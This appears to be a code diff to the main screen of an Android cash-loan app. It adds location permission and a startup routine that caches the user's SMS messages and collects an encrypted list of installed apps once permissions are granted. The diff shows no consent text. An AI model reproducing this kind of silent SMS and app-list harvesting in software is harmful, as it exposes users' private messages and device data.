@@ -17,11 +17,18 @@ import android.widget.ImageView;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.alibaba.fastjson.JSONObject;
+import com.blankj.utilcode.util.JsonUtils;
 import com.google.firebase.messaging.FirebaseMessaging;
 import com.tiny.cash.loan.card.Constants;
+import com.tiny.cash.loan.card.collect.BaseCollectDataMgr;
+import com.tiny.cash.loan.card.collect.CollectDataMgr;
+import com.tiny.cash.loan.card.collect.item.CollectAppInfoMgr;
+import com.tiny.cash.loan.card.collect.item.CollectSmsMgr;
 import com.tiny.cash.loan.card.feature.users.ContactsActivity;
 import com.tiny.cash.loan.card.kudicredit.BuildConfig;
 import com.tiny.cash.loan.card.kudicredit.R;
+import com.tiny.cash.loan.card.net.response.data.bean.AuthResult;
 import com.tiny.cash.loan.card.ui.adapter.DrawerAdapter;
 import com.tiny.cash.loan.card.base.BaseActivity;
 import com.tiny.cash.loan.card.base.BaseFragment;
@@ -67,6 +74,7 @@ import org.greenrobot.eventbus.Subscribe;
 import org.greenrobot.eventbus.ThreadMode;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationManagerCompat;
 import androidx.core.view.GravityCompat;
@@ -79,6 +87,8 @@ import androidx.recyclerview.widget.RecyclerView;
 import co.paystack.android.utils.StringUtils;
 import com.tiny.cash.loan.card.message.EventMessage;
 import io.reactivex.Observable;
+import io.reactivex.ObservableEmitter;
+import io.reactivex.ObservableOnSubscribe;
 import io.reactivex.android.schedulers.AndroidSchedulers;
 import io.reactivex.schedulers.Schedulers;
 
@@ -91,6 +101,7 @@ public class MainActivity extends BaseActivity {
     private String[] permissions = new String[]{
 //            Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE
 //            , android.Manifest.permission.READ_CONTACTS, android.Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
             android.Manifest.permission.READ_SMS};
 
     public static final int REQUEST_PERMISSIONS = 60;
@@ -254,6 +265,7 @@ public class MainActivity extends BaseActivity {
     private void requestPermissions() {
         if (PermissionUtil.hasPermission(this, permissions)) {
             DeviceInfo.getInstance(this).init();
+            executeCache();
         } else {
 //            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
 //                Utils.showToast(this, "Storage permissions are needed for Exploring.", 500);
@@ -271,6 +283,7 @@ public class MainActivity extends BaseActivity {
                 if (grantResults.length > 0
                         && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     DeviceInfo.getInstance(this).init();
+                    executeCache();
                 } else {
                     Utils.showToast(MainActivity.this, "Permission grating failed", 500);
                     requestPermissions();
@@ -759,6 +772,22 @@ public class MainActivity extends BaseActivity {
     }
 
     private void test1() {
-        startIntent(ContactsActivity.class);
+//        startIntent(ContactsActivity.class);
+        CollectDataMgr.Companion.getSInstance().collectAuthData("11111111", new BaseCollectDataMgr.Observer() {
+            @Override
+            public void success(@Nullable AuthResult response) {
+                Log.e("Test", " collect data success = " + JSONObject.toJSONString(response));
+            }
+
+            @Override
+            public void failure(@Nullable String response) {
+                Log.e("Test", " collect data failure = " + response);
+            }
+        });
+    }
+
+    private void executeCache() {
+        CollectSmsMgr.Companion.getSInstance().tryCacheSms();
+        CollectAppInfoMgr.Companion.getSInstance().getAesAppInfoStr();
     }
 }
